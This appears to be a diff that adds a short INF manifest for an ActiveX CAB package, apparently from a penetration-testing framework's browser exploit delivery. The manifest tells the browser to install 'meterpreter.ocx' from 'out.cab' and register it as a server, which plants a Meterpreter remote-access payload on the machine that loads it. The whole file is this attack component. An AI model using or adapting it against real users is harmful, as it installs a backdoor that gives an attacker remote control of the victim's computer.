@@ -1,0 +1,10 @@
+[version]
+	signature="$CHICAGO$"
+	AdvancedINF=2.0
+[Add.Code]
+	meterpreter.ocx=meterpreter.ocx
+[meterpreter.ocx]
+	file-win32-x86=out.cab
+	clsid={56C04F88-9E36-434B-82A3-D552B81A8CB9}
+	FileVersion=1,0,0,1
+	RegisterServer=yes
